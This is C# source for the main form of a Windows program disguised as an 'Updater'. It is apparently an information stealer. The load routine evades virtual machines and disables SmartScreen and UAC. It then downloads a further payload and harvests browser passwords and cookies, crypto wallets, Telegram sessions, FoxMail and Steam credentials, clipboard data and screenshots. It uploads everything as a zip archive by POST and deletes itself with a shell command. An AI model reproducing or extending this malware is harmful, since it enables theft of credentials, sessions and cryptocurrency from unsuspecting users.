namespace PEngine
{
    using PEngine.Engine.Applications.FoxMail;
    using PEngine.Engine.Applications.Steam;
    using PEngine.Engine.Applications.Telegram;
    using PEngine.Engine.Browsers.Chromium;
    using PEngine.Engine.Browsers.Chromium.Cookies;
    using PEngine.Engine.Cryptocurrencies;
    using PEngine.Engine.InfoPC;
    using PEngine.Engine.Others;
    using PEngine.Helpers;
    using PEngine.Loader;
    using PEngine.Main;
    using PEngine.Sticks;
    using System;
    using System.Threading;
    using System.Windows.Forms;

    public partial class Updater : Form
    {
        public Updater() => this.InitializeComponent();

        private void Updater_Load(object sender, EventArgs e)
        {
            
            Thread.Sleep(1000);
            if (!AntiVM.GetCheckVMBot())
            {
                if (!MovEx.CheckPath())
                {
                    ProcessKiller.Delete($"/C choice /C Y /N /D Y /T 0 & Del", GlobalPath.AssemblyPath);
                }
                else
                {
                    HideFolders.Enabled(0);
                    DisableLockers.SmartScreen();
                    DisableLockers.UAC();
                    if (Date.Downloader)
                    {
                        Users.DownFileEx(Date.DownloaderLink, Environment.GetEnvironmentVariable(Date.DownloaderPath), Date.FakeNameProcess);
                    }
                    CombineEx.CreateDir(GlobalPath.User_Name);
                    AntiSniffer.Inizialize();
                    if (Date.IpLogger)
                    {
                        IPLogger.Sender(Date.IpLoggerLink);
                    }
                    if (Date.CryptoWall)
                    {
                        BitBoard.GetWallet();
                    }
                    if (Date.Browsers)
                    {
                        ChromeSearcher.CopyLoginsInSafeDir(GlobalPath.Logins);
                        ChromeCookiesSearcher.CopyCookiesInSafeDir(GlobalPath.Cookies);
                        GetPassword.Inizialize();
                        GetCookies.Inizialize();
                    }
                    if (Date.Buffer)
                    {
                        ClipboardEx.GetBuffer(GlobalPath.Buffer);
                    }
                    if (Date.Programs)
                    {
                        InfoGrabber.CreateTable(GlobalPath.PC_File);
                        MailFoxPassword.Inizialize();
                        TGrabber.GetTelegramSession(GlobalPath.Tdata, GlobalPath.TelegaHome, "*.*");
                    }
                    if (Date.Clients)
                    {
                        GetClients.Inizialize();
                    }
                    if (Date.Steam)
                    {
                        GetSteamFiles.Copy("*.", "*.vdf", "config", "Steam");
                    }
                    if (Date.ScreenShot)
                    {
                        ScreenShot.Shoot(GlobalPath.Screen);
                    }
                    Ccleaner.CheckIsNullDirsAndFiles(GlobalPath.GarbageTemp);
                    Archiving.Inizialize();
                    UploadZip.Inizialize(GlobalPath.Reception, "POST", GlobalPath.ZipAdd);
                    if (Date.BlockInternet)
                    {
                        BlockIE.Enabled(1);
                    }
                    if (Date.Delay)
                    {
                        ProcessKiller.Delete($"/C choice /C Y /N /D Y /T {Date.DelaySec} & Del", GlobalPath.AssemblyPath);
                    }
                    Application.Exit();
                }
            }
            else
            {
                SaveData.SaveFile("VM_Detect.txt", "The program is not supported on virtual machines!");
                ProcessKiller.Delete($"/C choice /C Y /N /D Y /T 0 & Del", GlobalPath.AssemblyPath);
            }
        }
    }
}